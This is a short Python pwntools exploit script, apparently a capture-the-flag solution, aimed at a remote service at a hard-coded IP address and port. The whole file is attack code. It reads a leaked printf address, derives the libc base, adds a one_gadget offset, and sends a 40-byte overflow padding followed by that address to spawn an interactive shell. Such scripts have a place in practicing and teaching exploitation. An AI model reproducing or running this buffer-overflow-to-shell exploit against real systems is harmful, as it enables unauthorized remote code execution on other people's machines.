#!/usr/bin/env python2

from pwn import *

host = '167.71.233.105'
port = 8787
p = remote(host, port)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil('Mei idhar hu: ')
printf = (int(p.recv().strip(),16))

one_gadget = 0x4f2c5
printf_off = libc.symbols['printf']

#print (hex(printf_off))

libc_address = printf - printf_off
addr = one_gadget + libc_address

#print("i" * 40 + p64(addr))
p.sendline("i" * 40 + p64(addr))
p.interactive()


